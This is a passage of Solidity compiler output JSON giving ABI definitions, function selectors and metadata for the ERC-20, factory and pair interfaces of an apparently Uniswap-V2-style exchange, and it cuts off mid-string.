					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"IERC20.sol\":\"IERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"IERC20.sol\":{\"keccak256\":\"0xa45dab2f2a6e81dff31d7f62a0b0513ae09f7f01ee22d0970e2b532e2b14fad8\",\"urls\":[\"bzz-raw://5b5177e85ae0239a5d633ca2d83652b0fc63622f0bc317a3d32a3661f50d7537\",\"dweb:/ipfs/QmdV9Jp5icxxC3SYVVuwQTKXMcWicDToahxUxdkFCJC4M9\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"IFactory.sol": {
				"IFactory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pair",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "PairCreated",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "INIT_CODE_PAIR_HASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "allPairs",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "allPairsLength",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								}
							],
							"name": "createPair",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "feeTo",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "feeToSetter",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								}
							],
							"name": "getPair",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "setFeeTo",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "setFeeToSetter",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"INIT_CODE_PAIR_HASH()": "5855a25a",
							"allPairs(uint256)": "1e3dd18b",
							"allPairsLength()": "574f2ba3",
							"createPair(address,address)": "c9c65396",
							"feeTo()": "017e7e58",
							"feeToSetter()": "094b7415",
							"getPair(address,address)": "e6a43905",
							"setFeeTo(address)": "f46901ed",
							"setFeeToSetter(address)": "a2e74af6"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"PairCreated\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"INIT_CODE_PAIR_HASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"allPairs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"allPairsLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"}],\"name\":\"createPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeToSetter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"}],\"name\":\"getPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"setFeeTo\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"setFeeToSetter\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"IFactory.sol\":\"IFactory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"IFactory.sol\":{\"keccak256\":\"0x69d7f0c32f305449132b97119efc9d382c41c027f7739e312fdf3ca6b0bfc64d\",\"urls\":[\"bzz-raw://63280eb6f4eef4de9934869aee43278c3c5d48255b6c2ed9e10e6e4a136aae0b\",\"dweb:/ipfs/QmazKfJnm2PcDVZjBYLAZPyDrmPSmEnuurAvc7mbTKymAj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"IPair.sol": {
				"IPair": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								}
							],
							"name": "Sync",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Lockmint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "MINIMUM_LIQUIDITY",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReserves",
							"outputs": [
								{
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								},
								{
									"internalType": "uint32",
									"name": "blockTimestampLast",
									"type": "uint32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "initialize",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "kLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price0CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price1CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "skim",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "sync",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"Lockmint(address)": "dcbbb373",
							"MINIMUM_LIQUIDITY()": "ba9a7a56",
							"PERMIT_TYPEHASH()": "30adf81f",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"burn(address)": "89afcb44",
							"decimals()": "313ce567",
							"factory()": "c45a0155",
							"getReserves()": "0902f1ac",
							"initialize(address,address,uint256)": "1794bb3c",
							"kLast()": "7464fc3d",
							"mint(address)": "6a627842",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"price0CumulativeLast()": "5909c0d5",
							"price1CumulativeLast()": "5a3d5493",
							"skim(address)": "bc25cf77",
							"swap(uint256,uint256,address,bytes)": "022c0d9f",
							"symbol()": "95d89b41",
							"sync()": "fff6cae9",
							"token0()": "0dfe1681",
							"token1()": "d21220a7",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"}],\"name\":\"Sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Lockmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINIMUM_LIQUIDITY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReserves\",\"outputs\":[{\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"},{\"internalType\":\"uint32\",\"name\":\"blockTimestampLast\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kLast\",\"outputs\":[{\"internalType\":\